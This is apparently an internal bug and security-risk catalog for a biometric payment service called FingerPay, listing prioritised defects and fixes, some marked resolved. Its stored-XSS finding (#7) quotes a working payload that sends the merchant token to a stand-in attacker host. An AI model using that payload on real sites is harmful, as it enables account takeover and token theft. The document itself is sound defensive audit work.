# Known Bugs, Gaps, and Risks

Catalog of every defect discovered during a top-to-bottom read of the
codebase. Severity is engineering judgement: **P0** = ship-blocking, **P1**
= fix before pilot, **P2** = fix before scale, **P3** = polish/cleanup.

Each entry lists the file:line, what's wrong, why it matters, and a
suggested direction. Code is **not** changed by this document.

---

## P0 — Ship-blocking

### #1. JWT secret silently defaults to `dev-secret-change-in-prod`
- **Where:** `app/services/jwt.py:14`
- **What:** `SECRET_KEY = os.environ.get("FINGERPAY_SECRET", "dev-secret-change-in-prod")`
- **Why:** If the env var is missing in production, every JWT can be forged.
  Boot succeeds with no warning.
- **Fix direction:** Raise on missing env var at startup. Add an `init.py`
  validator called from `lifespan`.

### #2. Stripe Connect status update is broken in Postgres (production)
- **Where:** `app/routes/merchants.py:188-205`
- **What:** `connect_return` does
  ```python
  from pipeline.database import DB_PATH
  conn = sqlite3.connect(DB_PATH)
  ```
  `DB_PATH` only exists in the SQLite branch of `app/db/connection.py`. In Postgres
  mode it raises `ImportError`, swallowed by `except Exception: pass`. (Historically `pipeline/database.py`.)
  Additionally, Stripe AccountLink does not append `?account=` on return,
  so `account` is `None` even on SQLite.
- **Why:** Merchants are permanently stuck at `stripe_connect_status =
  pending`. They can't receive payouts. The existing `start_connect`
  short-circuits if status is already `active`, so the dashboard never
  recovers.
- **Fix direction:** (a) call existing `update_merchant_connect()` helper
  instead of raw SQL; (b) pass merchant_id in the return URL; (c) implement
  Stripe webhook (`account.updated`) to authoritatively set status; (d) make
  `start_connect` re-fetch status from Stripe even when local status is
  active.

### #3. Default JWT secret + no env validation = catastrophic boot
Same as #1 but combined with the fact that **none** of the critical env vars
are validated at startup. `BIOMETRIC_ENCRYPTION_KEY`, `STRIPE_SECRET_KEY`,
`FINGERPAY_SECRET`, `STRIPE_PUBLISHABLE_KEY` all silently fail open.

### #4. Monthly platform fee can exceed transaction amount
- **Where:** `app/services/stripe.py:47-52` + `app/routes/pay.py:76-87`
- **What:** ~~Platform fee = `amount * 0.005 + 0.05 + (29.00 if first tx of
  month)`~~ **Resolved.** FingerPay switched to a $99/month flat subscription
  model. No `application_fee_amount` is passed to Stripe. The full transaction
  amount routes directly to the merchant's Connect account.
- **Fix direction:** ~~Either (a) bill the monthly fee out-of-band via a
  separate Invoice on the Connect account, (b) cap the application fee at
  `amount - 1`, deferring the unbilled portion, or (c) bill monthly via a
  scheduled cron — *not* per-transaction.
- **Resolved.** Monthly fee decoupled from per-transaction fees. `calculate_platform_fee` no longer accepts `include_monthly`. Monthly billing deferred to out-of-band mechanism (future work). See ADR-0006. Tests in `tests/unit/test_stripe.py`.

### #5. POS WebSocket state is in-memory; breaks on restart and on multi-worker
- **Where:** `app/routes/pos.py:21-63` (`TerminalManager`)
- **What:** Both the connection map and the transaction status map are
  Python dicts inside the process. On restart, all in-flight POS
  transactions are lost (POS will poll `/pos/status/{id}` and 404). With
  `--workers > 1`, only one worker holds the WebSocket; charges hitting
  other workers will return 503 even though the terminal is connected.
- **Why:** Render and similar hosts restart processes for deploys, scaling
  events, and OOM. Customer card already charged, terminal shows success,
  but POS times out. Reconciliation nightmare.
- **Fix direction:** Move connection map + transaction state to Redis
  pub/sub. Or run a single-worker, sticky-instance setup (acknowledged as a
  pilot constraint).

### #6. Money charged but no DB row recorded
- **Where:** `app/routes/pay.py:96-110`
- **What:** If `record_transaction` raises after `charge_customer` succeeds,
  the customer is charged and `application_fee_amount` is taken, but no
  local `transactions` row exists. The merchant dashboard never sees it.
  No retry.
- **Why:** Any reconciliation between Stripe and the FingerPay dashboard
  will diverge silently.
- **Fix direction:** Insert a `pending` transaction row before charge,
  update with Stripe result. On record failure, log loudly and alert.
- **Resolved.** Pay route now uses `create_pending_transaction` (before Stripe) + `update_transaction_result` (after). On Stripe failure the row is marked `failed`. On post-charge DB failure a `CRITICAL` log is emitted with the Stripe PaymentIntent ID for reconciliation.

### #7. Stored XSS via `full_name` rendered with `innerHTML` on the dashboard
- **Where:** `static/merchant-dashboard.html:347-356`, `:449-456`
- **What:** Customer-supplied `full_name` is interpolated into a template
  string and assigned via `innerHTML`. Same for `email`. A customer enrolling
  with `full_name = "<img src=x onerror=fetch('https://evil/?'+localStorage.merchant_token)>"`
  hijacks the merchant token on dashboard load.
- **Why:** The merchant token can call `/regenerate-key`, view all
  customers, etc. Full merchant takeover via a single enrollment.
- **Fix direction:** Escape HTML in JS render path or use `textContent`. Add
  a strict CSP header.
- **Resolved.** Added `escapeHtml()` helper to `merchant-dashboard.html` and `customer-portal.html`. All user-controlled fields (`full_name`, `email`, `phone`, `customer_name`, `stripe_status`) now escaped. Added CSP, X-Frame-Options, X-Content-Type-Options, Referrer-Policy headers via middleware in `app/main.py`.

---

## P1 — Fix before pilot

### #8. No env-var validation at boot
Already noted in #3. Worth listing separately for tracking.

### #9. ORB matcher is not biometric-grade
- **Where:** `app/services/biometrics.py`
- **What:** ORB is generic CV feature extraction; threshold of 40 has no
  empirical biometric basis; no liveness; no anti-spoofing; no quality
  checks beyond keypoint count.
- **Why:** False acceptances are statistically certain at scale; spoofing is
  trivial (photo of a finger).
- **Fix direction:** Move to a real biometric SDK (Fingerprint Cards,
  Innovatrics, NEC) or partner. At minimum, add liveness + image quality
  scoring + ambiguity detection.

### #10. Linear scan over all fingerprints on every authenticate
- **Where:** `app/db/users.py:347-373`
- **What:** `find_user_by_fingerprint` reads ALL rows, decrypts each, runs
  ORB match. O(N) per request. ~100ms at 100 users; minutes at 100k.
- **Fix direction:** Bucket by quick-feature bucket / minutiae-based hashing
  / cluster-based prefilter. Or fall back to "user identifies via PIN, then
  fingerprint matches against ONE template." (1-to-1 vs 1-to-N is the
  fundamental design question.)

### #11. Login endpoint has no rate limiting
- **Where:** `app/routes/merchants.py:119`
- **What:** `slowapi` is wired up, but only `/authenticate` uses it. Login,
  signup, forgot-password, customer verify-code are all unbounded.
- **Why:** Credential stuffing on `/login`; verification-code brute-force on
  `/customers/verify-code` (1M codes, 6-digit space, 10-min window — at no
  rate limit a single IP can scan the full space in seconds).
- **Fix direction:** Apply `@limiter.limit("5/minute")` to login and
  verify-code; `@limiter.limit("3/minute")` to forgot-password and
  request-access.

### #12. Customer verify-code brute force
- **Where:** `app/routes/customers.py:90`, `app/db/tokens.py:626-640`
- **What:** No rate limit, no attempt counter. The 6-digit code with a
  10-min window is brute-forceable at network speed.
- **Fix direction:** Add per-email + per-IP rate limit. Lock the code after
  N failed attempts.

### #13. API key in WebSocket URL query string
- **Where:** `app/routes/pos.py:67-78`, `static/kiosk.html:234`
- **Why:** URLs are logged in proxies, ELB access logs, browser history,
  service worker logs. API keys shouldn't be in URLs.
- **Fix direction:** Authenticate the WebSocket via the first message after
  open: client sends `{"type":"auth","api_key":"..."}` in a 5-second window
  or the server closes.

### #14. Email enumeration on `/enroll/start`
- **Where:** `app/routes/enroll.py:81-82`
- **What:** Returns 400 "This email is already enrolled."
- **Why:** Unlike `forgot-password` and `request-access` (which correctly
  return 200 always), this leaks enrollment status.
- **Fix direction:** Continue with the enrollment but mark the session
  failed silently, or always return 200 with a generic message.

### #15. Resend uses `onboarding@resend.dev` sender
- **Where:** `app/routes/customers.py:40`, `app/routes/merchants.py:235`
- **Why:** Sandbox sender. Resend free tier restricts delivery to your own
  verified email. Will hit spam folders. Customers will think codes/resets
  are broken.
- **Fix direction:** Verify a domain (e.g. `noreply@fingerpay.com`).

### #16. No Stripe webhooks
- **Where:** Absent.
- **Why:** PaymentIntent failures (e.g. SCA challenges, disputes), Connect
  account state changes, refunds — all invisible to FingerPay.
- **Fix direction:** Add `/webhooks/stripe` with signature verification. At
  minimum handle `account.updated`, `payment_intent.payment_failed`,
  `charge.dispute.created`.

### #17. JWT type isn't checked on `/pay`
- **Where:** `app/services/jwt.py:60-70`, `app/routes/pay.py:48-53`
- **What:** `verify_access_token` accepts any token type. A merchant token
  used on `/pay` doesn't include `user_id`, so the next line raises
  KeyError → 500. Should be a clean 401.
- **Fix direction:** Mirror `verify_merchant_token`: check
  `payload.get("type") == "customer"`.

### #18. Threaded email send drops messages on crash
- **Where:** `app/routes/customers.py:74-78`, `app/routes/merchants.py:271`
- **What:** `threading.Thread(daemon=True).start()` → if the worker shuts
  down before the thread sends, the email is lost. Daemon threads are
  killed without cleanup.
- **Fix direction:** `BackgroundTasks` from FastAPI (still in-process but
  awaited before shutdown), or a real queue (Celery/RQ/Vercel Queues).

### #19. `merchant` field in `/pay` is client-controlled
- **Where:** `app/routes/pay.py:18-21`, `app/routes/pay.py:84` (passed to
  `charge_customer` description), `app/routes/pay.py:97-104` (stored in
  `transactions.merchant`)
- **What:** Client-supplied string is stored verbatim and used in the
  Stripe description.
- **Fix direction:** Drop the field from the request body. Derive
  merchant name from `merchants.business_name` via `merchant_id` from JWT.

### #20. No Stripe SCA / 3DS recovery
- **Where:** Absent.
- **What:** Off-session charges with European cards routinely return
  `requires_action`. The current code treats anything non-`succeeded` as
  success-with-status. There's no client redirect to authenticate.
- **Fix direction:** Detect `requires_action`, surface a recovery URL via
  email or push, retry on session.

### #21. Idempotency key per call defeats Stripe's idempotency
- **Where:** `app/services/stripe.py:78`
- **What:** `idempotency_key=str(uuid.uuid4())` is generated fresh in every
  `charge_customer` call. Idempotency keys are meaningful only when reused
  on retry of the SAME logical operation.
- **Fix direction:** Generate the idempotency key once per `/pay` request
  (e.g. hash of `transaction_id + user_id + amount + minute-precision time`)
  and pass it down.

### #22. Upload size middleware bypassable
- **Where:** `app/main.py:53-59`
- **What:** Only checks `Content-Length`. Chunked / no-content-length
  uploads bypass it.
- **Fix direction:** Stream and count bytes during read, or rely on a
  reverse proxy limit (nginx `client_max_body_size`).

### #23. PII (customer email) in application logs
- **Where:** `app/routes/customers.py:67`
- **What:** `logger.info("Customer access request for %s — found: %s",
  body.email, exists)`
- **Fix direction:** Hash or partial-mask emails in logs; document
  retention/redaction.

### #24. Connect onboarding return URL flow needs ground-up rebuild
See #2 + #16. The combination of in-band update (broken) and absent webhook
means status sync is non-functional.

---

## P2 — Fix before scale

### #25. No tests, no CI
- Zero `tests/` directory, zero `pytest`, no GitHub Actions.

### #26. Dependencies are unpinned
- **Where:** `requirements.txt`
- **What:** `fastapi`, `stripe`, `cryptography`, etc. all unpinned. A
  Stripe SDK breaking change can ship to production via a redeploy.
- **Fix direction:** Adopt `pip-tools` / `uv pip compile` and lock.

### #27. No connection pool
- **Where:** `app/db/connection.py:_get_conn`
- **What:** Fresh psycopg2 connection per request. Postgres TCP+auth ~5-10ms
  per call.
- **Fix direction:** `psycopg2.pool.ThreadedConnectionPool` or migrate to
  `asyncpg` + `SQLAlchemy` async.

### #28. No DB indexes beyond PK + UNIQUE
- See DATABASE.md.

### #29. Schema drift between SQLite and Postgres
- The SQLite branch hand-rolls `ALTER TABLE ADD COLUMN` migrations in a
  `try/except`. The Postgres branch has none. Adding a column means manual
  SQL on the live Postgres.
- **Fix direction:** Adopt Alembic.

### #30. No pagination on `get_merchant_customers` or recent transactions
- Returns all rows / hardcoded 10. Will not scale.

### #31. `enrollment_sessions` accumulate forever
- No expiry, no cleanup. Sessions abandoned at the QR step persist.
- **Fix direction:** Cron-style cleanup of `created_at < now - 24h`.

### #32. `temp_uploads/` orphan files on crash
- `try/finally` cleanup is best-effort. Add a periodic sweep of
  `temp_uploads/` older than 1 hour.

### #33. Time zone mixing
- See DATABASE.md "Time-zone inconsistencies." `enrolled_at` is local time;
  `expires_at` is UTC. Works on UTC hosts; breaks on local-TZ hosts.

### #34. No FK constraints
- Postgres tables have no `REFERENCES`. Orphan rows possible. Cascade
  deletes are manual.

### #35. Three deploy configs coexist
- `Dockerfile`, `Procfile`, `nixpacks.toml` — pick one. Right now Render
  appears canonical (see `APP_BASE_URL` default).
- **Resolved** by the restructure — consolidated to a single `Dockerfile`. `Procfile` and `nixpacks.toml` removed.

### #36. Health check endpoint absent
- No `/healthz` or `/readyz`. Hosts can't probe liveness.

### #37. uvicorn start command lacks `--proxy-headers`
- **Where:** `Dockerfile`
- **Why:** Without `--forwarded-allow-ips` and `--proxy-headers`, the rate
  limiter sees the load-balancer IP, not the client IP. All real users
  share one bucket.
- **Resolved** by the restructure — `Dockerfile` CMD now includes `--proxy-headers --forwarded-allow-ips=*`.

### #38. Default `merchants.is_active` column never read
- Soft-delete column without enforcement. Either wire it up or drop it.

### #39. `merchants.balance_after` always 0
- Column exists, never updated.

### #40. No SRI on CDN scripts
- `kiosk.html` loads QRCode.js from a public CDN with no `integrity=...`.
- `enroll.html` loads Stripe.js — Stripe documents that SRI shouldn't be
  used here, so this is acceptable; QRCode.js is not.

### #41. Customer dashboard renders code with `letter-spacing: 2px` but field is plain text
- Cosmetic, but the spacing on the email field is intentional only on the
  code field. Minor UX confusion. (`customer-portal.html:49`)

---

## P3 — Polish

### #42. README is two lines
Replace with a real overview (or link to `docs/README.md`).

### #43. `requirements.txt` doesn't include `python-multipart` is fine — but several deps overlap
`uvicorn[standard]` already pulls `python-dotenv`, `aiofiles`. Trim.

### #44. Inconsistent JWT module — two `Limiter` instances
- `app/main.py:36` and `app/routes/authenticate.py:21` both create `Limiter(key_func=
  get_remote_address)`. Only the `app/main.py` one is registered as the app
  state limiter. Defining it twice is a footgun.
- **Resolved** by the restructure — single `Limiter` instance in `app/main.py`.

### #45. `app/routes/merchants.py:194` does `import os` inside a function
Local imports inside `start_connect` (line 175) and inside `connect_return`
(line 196) — unnecessary; module-level imports are already there.
- **Resolved** by the restructure — config imported from `app.config`.

### #46. `app/routes/pay.py:70` does `from datetime import datetime` inside the function
Same pattern. Already imported at module top? No — actually not. Adds one
line of overhead per call. Move to top.
- **Resolved** by the restructure — `from datetime import datetime` is now at the top of `app/routes/pay.py`.

### #47. `app/routes/customers.py` imports `_get_conn`, `_fetchone`, `PH` (private)
- Bypasses the database module's API. Should expose a `get_user_by_email`
  function in `app/db/users.py` and use it.
- **Resolved** by the restructure — `app/routes/customers.py` now uses `app.db.get_user_by_email()`.

### #48. `app/services/biometrics.py` `match_score` allows `crossCheck=False` + ratio test
- Acceptable, but the `crossCheck` flag is meaningless when used with
  `knnMatch(k=2)`. Slightly misleading.

### #49. `cap_kiosk` does not set `data-testid` or use semantic markup
- Accessibility + automated testing would benefit.
